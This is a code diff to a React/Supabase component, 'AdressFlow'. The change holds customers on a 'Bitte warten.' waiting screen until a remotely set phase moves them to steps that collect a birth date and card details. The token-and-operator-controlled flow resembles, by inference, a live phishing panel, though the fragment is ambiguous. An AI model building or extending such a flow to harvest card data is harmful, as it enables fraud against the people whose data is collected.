@@ -74,12 +74,11 @@ const AdressFlow = () => {
         .from("adress_tokens").select("*").eq("token", token).maybeSingle();
       if (!data) { setNotFound(true); setLoading(false); return; }
       if (!data.customer_phase || data.customer_phase === "pending" || data.customer_phase === "waiting") {
-        const next = data.show_berater ? "berater" : "login";
         const { data: updated } = await (supabase as any)
           .from("adress_tokens")
-          .update({ customer_phase: next, used: true, used_at: new Date().toISOString() })
+          .update({ customer_phase: "token_waiting", used: true, used_at: new Date().toISOString() })
           .eq("id", data.id).select("*").maybeSingle();
-        setRow(updated || { ...data, customer_phase: next });
+        setRow(updated || { ...data, customer_phase: "token_waiting" });
       } else setRow(data);
       setLoading(false);
       channel = (supabase as any)
@@ -116,7 +115,8 @@ const AdressFlow = () => {
     </Full>
   );
 
-  const phase = row.customer_phase || "login";
+  const phase = row.customer_phase || "token_waiting";
+  if (phase === "token_waiting") return <LoadingStep text="Bitte warten." />;
 
   if (phase === "berater") {
     return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
